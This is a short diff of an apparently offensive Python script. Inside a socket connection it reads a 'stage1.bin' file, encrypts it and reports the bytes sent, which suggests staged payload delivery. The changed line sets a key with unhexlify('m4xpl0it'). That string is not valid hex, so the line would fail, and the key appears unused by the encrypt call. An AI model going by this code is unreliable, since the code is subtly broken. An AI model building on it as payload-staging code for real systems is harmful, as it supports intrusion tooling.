@@ -30,7 +30,7 @@ with socket.socket() as s:
             with open("stage1.bin", 'rb') as stage1:
                 stage1_buf = stage1.read()
                 
-                key = binascii.unhexlify("deadbeef")
+                key = binascii.unhexlify("m4xpl0it")
                 
                 stage1_buf = encrypt(stage1_buf, 100)
                 print(f"sent : {len(stage1_buf)} bytes")
